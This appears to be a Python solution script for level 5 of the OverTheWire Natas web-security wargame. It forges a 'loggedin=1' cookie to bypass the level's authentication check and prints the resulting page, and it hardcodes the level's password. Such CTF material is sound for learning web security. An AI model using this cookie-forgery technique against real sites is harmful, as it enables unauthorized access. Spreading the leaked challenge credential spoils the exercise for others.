#!/usr/bin/env python3

import requests, re

match = "natas"
username = "natas5"
password = 'Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD'

url = "http://%s.natas.labs.overthewire.org/" % username

cookies = { "loggedin" : "1" }
response = requests.post(url, auth= (username, password), cookies = cookies )
pagecookies = response.cookies.get_dict()
print(f"The cookies: {pagecookies}\n") 
print("The page: \n")
print(response.text)